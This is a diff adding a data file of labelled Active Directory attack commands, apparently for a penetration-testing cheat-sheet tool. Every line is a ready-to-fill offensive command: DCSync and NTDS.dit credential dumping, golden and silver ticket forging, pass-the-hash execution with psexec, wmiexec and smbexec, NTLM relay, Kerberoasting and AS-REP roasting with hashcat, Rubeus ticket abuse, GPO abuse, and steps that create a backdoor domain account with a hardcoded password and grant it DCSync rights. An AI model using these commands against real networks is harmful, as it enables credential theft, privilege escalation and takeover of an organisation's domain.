@@ -1,0 +1,44 @@
+Impacket Secretsdump (DCSync):impacket-secretsdump -dc-ip <dc-ip> <domain>/<user>:<password>@<dc-ip>
+Impacket Secretsdump (DCSync):impacket-secretsdump -k -no-pass -dc-ip <dc-ip> <domain>/@<dc-ip>
+Impacket Secretsdump (NTDS.dit):impacket-secretsdump -ntds <file> -system <file> LOCAL
+Impacket Golden Ticket:impacket-ticketer -nthash <ntlm> -domain-sid <file> -domain <domain> <user>
+Impacket Silver Ticket:impacket-ticketer -nthash <ntlm> -domain-sid <file> -domain <domain> -spn <file> <user>
+Impacket PSExec:impacket-psexec -dc-ip <dc-ip> <domain>/<user>:<password>@<target>
+Impacket PSExec (NTLM):impacket-psexec -hashes :<ntlm> -dc-ip <dc-ip> <domain>/<user>@<target>
+Impacket WMIExec:impacket-wmiexec -dc-ip <dc-ip> <domain>/<user>:<password>@<target>
+Impacket WMIExec (NTLM):impacket-wmiexec -hashes :<ntlm> -dc-ip <dc-ip> <domain>/<user>@<target>
+Impacket SMBExec:impacket-smbexec -dc-ip <dc-ip> <domain>/<user>:<password>@<target>
+Impacket SMBExec (NTLM):impacket-smbexec -hashes :<ntlm> -dc-ip <dc-ip> <domain>/<user>@<target>
+Impacket GetUserSPNs:impacket-GetUserSPNs -dc-ip <dc-ip> <domain>/<user>:<password> -request
+Impacket GetUserSPNs:impacket-GetUserSPNs -dc-ip <dc-ip> -k -no-pass <domain>/ -request
+Impacket GetUserSPNs (NTLM):impacket-GetUserSPNs -dc-ip <dc-ip> -hashes :<ntlm> <domain>/<user> -request
+Impacket DCOM Exec:impacket-dcomexec -dc-ip <dc-ip> <domain>/<user>:<password>@<target>
+Impacket DCOM Exec (NTLM):impacket-dcomexec -hashes :<ntlm> -dc-ip <dc-ip> <domain>/<user>@<target>
+Impacket SMB Relay: impacket-ntlmrelayx -tf <file> -smb2support -socks
+Impacket SMB Relay (Commands):impacket-ntlmrelayx -tf <file> -smb2support -c whoami
+Impacket SMB Relay (Dump):impacket-ntlmrelayx -tf <file> -smb2support -of <filename>
+Impacket LDAP Shell:impacket-ldapshell -dc-ip <dc-ip> <domain>/<user>:<password>@<dc-ip>
+Impacket MSSQL Shell:impacket-mssqlclient -dc-ip <dc-ip> <domain>/<user>:<password>@<target>
+Impacket Kerberos Auth:impacket-psexec -k -no-pass -dc-ip <dc-ip> <domain>/<user>@<target>
+Rebeus Overpass The Hash:Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /ptt
+Rebeus Pass The Ticket:Rubeus.exe ptt /ticket:<file>
+Rebeus Ticket Converter (Kirbi to CCache):Rubeus.exe convert /ticket:<file> /format:ccache
+Rebeus Ticket Converter (CCache to Kirbi):Rubeus.exe convert /ticket:<file> /format:kirbi
+Rebeus DES Roast:Rubeus.exe kerberoast /tgtdeleg
+Rebeus Unconstrained Delegation:Rubeus.exe monitor /interval:5 /filteruser:<user>
+Rebeus Constrained Delegation:Rubeus.exe monitor /interval:5 /nowrap
+Impacket (AS-REP Roasting):impacket-GetNPUsers '<domain>/' -dc-ip <dc-ip> -usersfile <filename1> -no-pass
+Impacket (AS-REP Roasting):echo <AS-REP hash> > <filename2>
+Impacket (AS-REP Roasting):sudo hashcat -m 18200 <filename2> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+GPO abuse to add local admin: '.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy" ; gpupdate /force'
+Kerberoasting:impacket-GetUserSPNs -dc-ip <dc-ip> <domain>/<user>:<password> -request #requesting service ticket from domain controller, DC replies with TGS-REP hash
+Kerberoasting:echo <TGS-REP hash> > <filename1>
+Kerberoasting:sudo hashcat -m 13100 <filename1> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+DCSync:net user edwin P@ssw0rd@123 /add /domain ;
+DCSync:net group "<group with writedacl>" edwin /add ;
+DCSync:net localgroup "Remote Management Users" edwin /add ;
+DCSync:net localgroup "Remote Desktop Users" edwin /add
+DCSync:$password = ConvertTo-SecureString "" -AsPlainText -Force
+DCSync:$cred = New-Object System.Management.Automation.PSCredential("<domain>\edwin", $password)
+DCSync:Add-objectACL -PrincipalIdentity edwin -Credential $cred -Rights DCSync
+DCSync:impacket-secretsdump '<domain>/edwin'@<target>
